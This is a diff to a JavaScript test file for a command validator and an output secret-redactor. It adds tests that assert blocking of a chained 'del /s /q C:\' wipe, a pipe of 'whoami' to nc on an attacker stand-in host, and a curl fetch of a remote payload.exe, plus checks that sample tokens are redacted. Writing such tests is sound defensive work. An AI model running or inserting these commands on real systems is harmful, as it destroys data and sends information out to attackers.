@@ -101,12 +101,28 @@ describe('System Intelligence Pure Business Logic', () => {
     const safeReadOnly = validateLocalCommand('rclone listremotes');
     assert.equal(safeReadOnly.allowed, true);
     assert.equal(safeReadOnly.riskLevel, 'Safe Read-Only');
+
+    // Command injection protection (&&, ;, |, $(), `)
+    const chainedInjection = validateLocalCommand('rclone version && del /s /q C:\\');
+    assert.equal(chainedInjection.allowed, false);
+    assert.ok(chainedInjection.blockedReason?.includes('Command Injection Protection'));
+
+    const pipeInjection = validateLocalCommand('whoami | nc attacker.example.com 4444');
+    assert.equal(pipeInjection.allowed, false);
+
+    // Unauthorized binary not on allowlist
+    const unauthorizedBinary = validateLocalCommand('curl.exe https://malicious.example.com/payload.exe');
+    assert.equal(unauthorizedBinary.allowed, false);
+    assert.ok(unauthorizedBinary.blockedReason?.includes('Command Allowlist Violation'));
   });
 
-  it('redacts OAuth tokens and API secrets from output', () => {
-    const raw = 'Token: ya29.a0AfH6SMBx91234567890_secret and access_token="my_super_secret_token"';
+  it('redacts OAuth tokens, Bearer headers, GitHub PATs, and API secrets from output', () => {
+    const raw =
+      'Token: ya29.a0AfH6SMBx91234567890_secret and access_token="my_super_secret_token" and Authorization: Bearer eyJhbGciOiJIUzI1NiJ9 and ghp_1234567890abcdefghijklmnopqrstuv';
     const redacted = redactSecretsFromOutput(raw);
     assert.ok(!redacted.includes('my_super_secret_token'));
+    assert.ok(!redacted.includes('eyJhbGciOiJIUzI1NiJ9'));
+    assert.ok(!redacted.includes('ghp_1234567890abcdefghijklmnopqrstuv'));
     assert.ok(redacted.includes('[REDACTED'));
   });
 
